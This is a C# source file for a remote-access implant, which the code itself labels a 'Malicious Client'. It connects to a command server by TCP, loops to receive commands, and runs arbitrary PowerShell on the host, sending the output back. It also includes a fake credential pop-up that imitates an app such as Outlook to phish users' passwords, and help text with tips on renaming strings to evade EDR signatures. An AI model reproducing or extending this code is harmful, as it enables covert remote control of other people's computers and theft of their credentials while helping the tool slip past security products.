
// A C# program for the Raw TCP Client
//using System; //greyed out
//using System.ComponentModel.DataAnnotations; //greyed out
//using System.Data; //greyed out
using System.Net;
using System.Net.Sockets;
//using System.Numerics; //greyed out
//using System.Runtime.CompilerServices;  //greyed out
using System.Text;
using System.Text.Json;
//using static System.Runtime.InteropServices.JavaScript.JSType; //greyed out
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System;


//coms directory
using Client.Comms;


namespace Client
{

    class Program
    {

        // Main Method
        static void Main(string[] args)
        {
            //generates relavant data
            Client.PropertyHandler.Properties.GenerateData();

            //debug data
            Console.Write("DEBUG::\n");
            Console.Write($"\tID: {Client.PropertyHandler.Properties.ID}\n");
            JsonHandler.Test();
            JsonHandler.ToJson();
            JsonHandler.FromJson();



            //Commands.runPowershellCommand("whoami");
            //Prompts.requestUserCreds();

            // enters loop for jobs n stuff
            ConnectToServer();
        }

        // Connection to Server
        public static void ConnectToServer()
            /* Note, need to create a class or at least methods that handle the heartbeat and other commands, this is currently set to handle
             just the init client send to the server*/ 
        {
            while (true)
            {
                try
                {

                    // Establish the remote endpoint
                    // for the socket. This example
                    // uses port 11111 on the local
                    // computer.
                    //IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());

                    //string to IP, it wants a System.Net.IPAddress for security/validation reasons
                    var ip = IPAddress.Parse("127.0.0.1");
                    IPAddress ipAddr = ip; //ipHost.AddressList[0]; //just localhost
                    //Console.Write($"[DEBUG] ipHost.AddressList: {ipHost.AddressList}");

                    IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 8080);

                    // Creation TCP/IP Socket using
                    // Socket Class Constructor
                    Socket sender = new Socket(ipAddr.AddressFamily,
                            SocketType.Stream, ProtocolType.Tcp);

                    try
                    {

                        // Connect Socket to the remote
                        // endpoint using method Connect()
                        sender.Connect(localEndPoint);

                        // We print EndPoint information
                        // that we are connected
                        //Console.WriteLine("Socket connected to -> {0} ",
                        //sender.RemoteEndPoint.ToString());

                        // Creation of message that
                        // we will send to Server

                        //temp getting JSON object & sendingit on over
                        //byte[] messageSent = Encoding.ASCII.GetBytes(JsonHandler.ToJson());
                        //int byteSent = MessageHandler.SendMessage(msg: messageSent, conn: sender);
                        MessageHandler.SendMessage(msg: JsonHandler.ToJson(), conn: sender);



                        // Data buffer
                        byte[] messageReceived = new byte[1024];

                        // We receive the message using
                        // the method Receive(). This
                        // method returns number of bytes
                        // received, that we'll use to
                        // convert them to string
                        Console.Write("waiting on message from server\n");

                        //int byteRecv = sender.Receive(messageReceived);

                        //custom receieve function
                        //string stringRecv = Message.RecvMessage(sender);
                        string stringRecv = Comms.MessageHandler.RecvMessage(sender);


                        //string stringRecv = Encoding.ASCII.GetString(messageReceived,0, byteRecv);

                        Console.WriteLine($"Message from Server -> {stringRecv}");


                     

                        // parse message
                        //string[] parsedMessage;
                        //parsedMessage = (string[])Message.Parse(stringRecv);
                        //Console.Write($"[Debug]] Parsing Message: {parsedMessage[0]}, {parsedMessage[1]} \n");

                        //Thread.Sleep(15000);
                        // string parsedMessageCommand = parsedMessage[1];


                        //logic to determine if this is a session or not. 
                        // if it is, loop, if not, send command as usual
                        //string[] parsedCommand;
                        //parsedCommand = Message.CommandParse(stringRecv);

                        //Console.Write($"[Debug]: rawCommand: {parsedCommand}, \n");
                        //Console.Write($"[Debug]: parsedCommand: {parsedCommand[0]},{parsedCommand[1]} \n");

                        string DataFromTarget;


                        if (stringRecv == "session")
                        {
                            //need to send a-ok message
                            //Message.SendMessage("Session opened", sender);
                            while (1 == 1)
                            // session loop

                            //NOTE: No parsing on session commands. Creates too much damned havoc. 
                            //decision tree with parse the commands (command\\|/command) IF NECCESARY.
                            // this just (nicely) passes the command along to the decision tree to handle
                            {
                                byte[] newMessageReceived = new byte[1024];
                                Console.Write("[Debug] Session Command, waiting to recieve message...");
                                //int sessionByteRecv = sender.Receive(newMessageReceived);
                                //string sessionStringRecv = Encoding.ASCII.GetString(newMessageReceived, 0, byteRecv);
                                
                                //again custom recieve
                                string sessionStringRecv = MessageHandler.RecvMessage(sender);
                                //string[] sessionParsedCommand = Message.CommandParse(sessionStringRecv);

                                //Console.Write($"\nSession Parsed Commands: {sessionParsedCommand[0]}, {sessionParsedCommand[1]}\n");

                                if (sessionStringRecv == "break")
                                {
                                    MessageHandler.SendMessage("Closing Session", sender);
                                    break;
                                }
                                else
                                {
                                    //run through decision tree
                                    Console.Write("Running through decision tree\n");
                                    //passes socket into here so it can make socket commands if necessary. Keeps it clean(er) that accessing socket from anywhere
                                    DataFromTarget = DecisionTree(sessionStringRecv, sender);
                                    Console.Write($"Sending message {DataFromTarget} back...\n");
                                    MessageHandler.SendMessage(DataFromTarget, sender);
                                    //send back
                                }

                            }

                        }

                        else
                        {
                            Console.Write("Decision Tree");
                            //decision tree calls method
                            //decision tree returns data (or waits if wait)
                            DataFromTarget = DecisionTree(stringRecv, sender);
                            Console.Write($"[DEBUG] Message to send back: {DataFromTarget}");
                            //Data is sent to 'send' method (takes the message, and the socket as args)
                            MessageHandler.SendMessage(DataFromTarget, sender);
                            //mandatory sleep b4 heartbeat & loop restart
                            Thread.Sleep(Client.PropertyHandler.Properties.msWait);
                        }
                        //loop restarts

                    }

                    // Manage of Socket's Exceptions
                    // these will need to be silenced eventually, and fall back to a continue/loop restart after waiting
                    catch (ArgumentNullException ane)
                    {

                        Console.WriteLine("ArgumentNullException : {0}", ane.ToString());
                    }

                    catch (SocketException se)
                    {

                        Console.WriteLine("SocketException : {0}", se.ToString());
                    }

                    catch (Exception e)
                    {
                        Console.WriteLine("Unexpected exception : {0}", e.ToString());
                    }
                }

                catch (Exception e)
                {

                    Console.WriteLine(e.ToString());
                }
            }
        }
        
        static string DecisionTree(string rawCommand, Socket conn)
        {

            //initialzing if needed later
            string[] parsedCommand;
            string command;
            string commandValue;

            // parsing has been moved to a per-command basis. 


            if (rawCommand == "wait" || rawCommand == "")
            {
                Console.WriteLine($"[Debug] Waiting, Command was: {rawCommand}");
                //in this case, return nothing. 
                return "waiting";
            }

            else if (rawCommand == "help")
            {
                return """
                Help Screen, brought to you by Windows Defender

                [Client Settings]
                set-heartbeat time (int): Setting the heartbeat for this very client to sleep for between checkins!
                    Ex: set-heartbeat 15

                [Get yourself caught by the EDR... I mean run commands!]:
                run-command-ps COMMAND: Runs a powershell command
                    Ex: run-command-ps whoami
                    Note: being a picky bastard at the moment

                [Other]
                sanity-check X: A sanity check that only returns a short string about how it works. Handy for sanity checks when you want to throw your PC through a window.
                    Note: due to current limitation, you must include a character after the word 'sanity-check', i.e: 'sanity-check a'


                [Common errors]:
                "Command unknown": You entered the command wrong. or I broke the code somewhere. Your choice on who to blame


                FYI if anyone ever uses this, I'm betting this help menu will get signatured as f*ck. So keep that in mind. (for those new to offense, that means change this help menu
                    to some other words, or exclude it entirely/replace with a string of something, as EDR's will recognize it and flag it)
                """;
            }

            else if (rawCommand.Contains("set-heartbeat") == true)
            {
                //not super clean but it works
                try
                {
                    //parsedCommand = Message.CommandParse(rawCommand);
                    command = ""; //parsedCommand[0];
                    commandValue = ""; //parsedCommand[1];
                }
                catch (Exception e)
                {
                    //sending error to freindly client
                    Console.Write($"[Debug] Command Error was: {e.ToString()}\n");
                    MessageHandler.SendMessage("Error with command, make sure it's valid", conn);
                    command = "";
                    commandValue = "";
                }

                int time;
                try
                {
                    time = Int32.Parse(commandValue);
                    Console.WriteLine($"[DEBUG] Heartbeat set");
                }

                catch (FormatException)
                {
                    Console.WriteLine($"[DEBUG] Unable to parse '{commandValue}'");
                    time = 60;
                }

                ClientControls.SetHeartbeat(time);

            }

            else if (rawCommand.Contains("run-command-ps") == true)
            {

                //not super clean but it works
                try
                {
                    //parsedCommand = Message.CommandParse(rawCommand);
                    command = "";//parsedCommand[0];
                    commandValue = ""; //parsedCommand[1];
                }
                catch (Exception e)
                {
                    //sending error to freindly client
                    Console.Write($"[Debug] Command Error was: {e.ToString()}\n");
                    MessageHandler.SendMessage("Error with command, make sure it's valid", conn);
                    command = "";
                    commandValue = "";
                }

                Console.WriteLine($"run-command-ps, Command was: {command}");
                return Commands.runPowershellCommand(commandValue);
                //return commandValue;
            }

            else if (rawCommand == "sanity-check")
            {
                return "This message has been returned from the client decision tree, and made it's way back to you. TLDR: it fucking works! BTW those triangles are the header bytes";
            }

            //prompt block

            else if (rawCommand == "prompt-credentials")
            {
                string targetMessage;
                string targetApp;
                string credResults;


                MessageHandler.SendMessage("Please enter the message that the target will see. Ex: 'Outlook is requesting your credentials:'", conn);
                //no need to parse this one as it's getting sent over raw, and only getting one answer
                targetMessage = MessageHandler.RecvMessage(conn);

                MessageHandler.SendMessage("Please enter the app this request will seemingly come from (used in popup header) Ex: 'Outlook.exe'", conn);
                //same here as above
                targetApp = MessageHandler.RecvMessage(conn);

                //sending to function
                credResults = Prompts.requestUserCreds(targetMessage, targetApp);

                return credResults;
            }

            return $"[Debug: From Malicious Client] Command unknown: {rawCommand} ";
        }
    }


    class ClientControls
        /*  A set of functions for controlling client data/settings */

    {
        public static void SetHeartbeat(int time)
        {
            int timeInSec;

            //time is in MS, so this converts to MS
            timeInSec = time * 1000;

            Client.PropertyHandler.Properties.msWait = timeInSec;
        }
    }




    class SystemData
        /* used to retrieve system data from the target. each method returns the data */
    {
        static string hardwareInfo() 
        {
            //get hardware info using something .net api windows thingy

            return "hardware_info";
        }

        static string softwareInfo()
        {
            return "hardware_info";
        }

        static string userInfo()
        {
            //maybe request user hash etc, or groups etc
            return "user_info";
        }
    }

    class Prompts
        /* prompts/popups via native windows API's */
    {
        public static string requestUserCreds(string message, string applicationName)
        {
            /* pops a user credential box on screen 
             Would be cool to have it say something custom, or give the friendly use the option to input a custom message 
            (maybe prompt-usercreds-popup\|/custom-message?)

             */
            //https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7.3
            // https://stackoverflow.com/questions/9476681/creduipromptforcredentials-forcing-manual-selection-of-user-name

            //initializing a new instance of CredentialPrompt
            CredentialPrompt prompt = new CredentialPrompt();


            //prompt.Prompt()
            string[] Credentials = prompt.Prompt(message, applicationName);

            Console.Write($"User: {Credentials[0]} Pass: {Credentials[1]}");

            return "User:Pass";
        }
    }

    class Commands
    {
        //temp public for testing
        public static string runPowershellCommand(string command)
        /* runs a PS command - most likely will get flagged by edr, creats a PS subprocess on EACH CALL*/
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = command;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;

            // Create a new Process object and start it
            Process proc = new Process();
            proc.StartInfo = psi;
            proc.Start();

            // Read the output of the PowerShell command
            string output = proc.StandardOutput.ReadToEnd();

            // Display the output in the console
            Console.WriteLine(output);

            // Wait for the process to exit
            proc.WaitForExit();

            return output;
        }
    }

}

